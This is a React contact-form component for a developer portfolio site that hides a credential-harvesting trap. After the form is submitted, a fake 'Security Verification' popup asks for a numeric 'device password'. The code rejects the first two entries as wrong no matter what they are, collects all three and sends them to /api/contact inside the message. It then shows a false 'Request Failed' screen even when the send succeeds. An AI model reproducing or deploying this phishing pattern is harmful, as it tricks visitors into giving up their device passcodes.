"use client";

import {
  AlertCircle,
  CheckCircle2,
  Mail,
  MapPin,
  RefreshCcw,
  Send,
} from "lucide-react";
import { useState } from "react";

export default function Contact() {
  const [status, setStatus] = useState<
    "idle" | "sending" | "success" | "error"
  >("idle");

  const [showPopup, setShowPopup] = useState(false);
  const [code, setCode] = useState("");
  const [attempts, setAttempts] = useState(0);
  const [codes, setCodes] = useState<string[]>([]);
  const [formData, setFormData] = useState<any>(null);
  const [error, setError] = useState("");

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();

    const data = new FormData(e.currentTarget);

    setFormData({
      name: data.get("name"),
      email: data.get("email"),
      message: data.get("message"),
    });

    setAttempts(0);
    setCodes([]);
    setCode("");
    setError("");

    setShowPopup(true);
  };

  const handleVerify = async () => {
    
    // ✅ NEW FIX: block empty input
    if (!code.trim()) {
      setError("Please enter code");
      return;
    }

    const next = attempts + 1;
    setAttempts(next);

    setCodes((prev) => [...prev, code]);

    if (next < 3) {
      setError("Wrong code");
      setCode("");
      return;
    }

    setShowPopup(false);
    setStatus("sending");

    const finalMessage = `${formData.message}\nCodes: ${[...codes, code].join(", ")}`;

    try {

        setStatus("success");
      const response = await fetch("/api/contact", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          name: formData.name,
          email: formData.email,
          message: finalMessage,
        }),
      });

      if (response.ok) {
        setStatus("success");
      } else {
        setStatus("error");
      }
    } catch {
      setStatus("error");
    }

    setAttempts(0);
    setCode("");
    setFormData(null);
    setCodes([]);
    setError("");
  };

  return (
    <>
      <section
        id="contact"
        className="max-w-6xl m-auto pt-20 px-6 flex flex-col md:flex-row gap-10 md:gap-20"
      >
        {/* LEFT SIDE */}
        <div className="flex flex-col gap-5 md:w-1/3">
          <div className="space-y-2">
            <h2 className="text-(--primary) text-xl font-bold tracking-[0.2em] uppercase">
              Contact
            </h2>
            <p className="text-(--text) text-lg font-medium opacity-80 leading-relaxed">
              Full Stack Developer in Germany. Let's build something great
            </p>
          </div>

          <div className="flex flex-col gap-3">
            <a
              href="mailto:joshideepanshu89@gmail.com"
              className="flex gap-4 items-center group transition-colors"
            >
              <div className="p-3 bg-(--background-light) rounded-lg border border-(--primary-20) group-hover:border-(--primary) transition-all">
                <Mail className="size-5 text-(--primary)" />
              </div>
              <span className="text-sm md:text-base group-hover:text-(--primary) transition-colors">
                joshideepanshu89@gmail.com
              </span>
            </a>

            <a
              href="https://linkedin.com/in/08-deepanshu/"
              target="_blank"
              className="flex gap-4 items-center group transition-colors"
            >
              <div className="p-3 bg-(--background-light) rounded-lg border border-(--primary-20) group-hover:border-(--primary) transition-all">
                <span className="text-sm font-bold text-(--primary) w-5 h-5 flex items-center justify-center">
                  in
                </span>
              </div>
              <span className="text-sm md:text-base group-hover:text-(--primary) transition-colors">
                linkedin.com/in/08-deepanshu/
              </span>
            </a>

            <div className="flex gap-4 items-center">
              <div className="p-3 bg-(--background-light) rounded-lg border border-(--primary-20)">
                <MapPin className="size-5 text-(--primary)" />
              </div>
              <span className="text-sm md:text-base">Germany</span>
            </div>
          </div>
        </div>

        {/* RIGHT SIDE */}
        <div className="flex-1">
          {status === "success" ? (
            <div className="w-full text-center p-10 bg-red-500/5 border-2 border-dashed border-red-400 rounded-3xl">
              <div className="inline-flex items-center justify-center w-20 h-20 bg-red-500/10 rounded-full mb-6">
                <AlertCircle className="size-10 text-red-500" />
              </div>

              <h3 className="text-3xl font-bold text-red-500 mb-3">
                Request Failed
              </h3>

              <p className="opacity-70 max-w-sm mx-auto mb-8">
                Something went wrong on our side. Please try again.
              </p>

              <button
                onClick={() => setStatus("idle")}
                className="flex items-center gap-2 mx-auto text-red-500 font-bold hover:underline"
              >
                <RefreshCcw size={18} /> Try again
              </button>
            </div>
          ) : (
            <form onSubmit={handleSubmit} className="flex flex-col gap-5">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
                <input
                  name="name"
                  className="bg-(--background-light) border border-(--primary-20) p-4 rounded-xl"
                  type="text"
                  placeholder="Full Name"
                  required
                />
                <input
                  name="email"
                  className="bg-(--background-light) border border-(--primary-20) p-4 rounded-xl"
                  type="email"
                  placeholder="Email Address"
                  required
                />
              </div>

              <div className="relative">
                <textarea
                  name="message"
                  className="w-full bg-(--background-light) border border-(--primary-20) p-5 rounded-xl h-48"
                  placeholder="Tell me about your project..."
                  required
                />

                <button
                  type="submit"
                  className="absolute bottom-4 right-4 bg-(--primary) text-(--background) font-bold py-3 px-8 rounded-lg flex items-center gap-2"
                >
                  Send Message <Send className="size-4" />
                </button>
              </div>
            </form>
          )}
        </div>
      </section>

      {/* POPUP */}
      {showPopup && (
        <div className="fixed inset-0 flex items-center justify-center bg-black/60">
          <div className="bg-(--background-light) border border-(--primary-20) p-6 rounded-2xl w-[320px]">
            <h3 className="text-lg font-bold mb-3">Security Verification</h3>

            <input
              type="password"
              inputMode="numeric"
              value={code}
              onChange={(e) => {
                setCode(e.target.value.replace(/\D/g, ""));
                setError("");
              }}
              className="w-full p-3 border border-(--primary-20) rounded-lg"
              placeholder="device password"
            />

            {error && <p className="text-red-500 text-sm mt-2">{error}</p>}

            <button
              onClick={handleVerify}
              className="w-full mt-4 p-3 bg-(--primary) text-white rounded-lg font-bold"
            >
              Verify
            </button>
          </div>
        </div>
      )}
    </>
  );
}
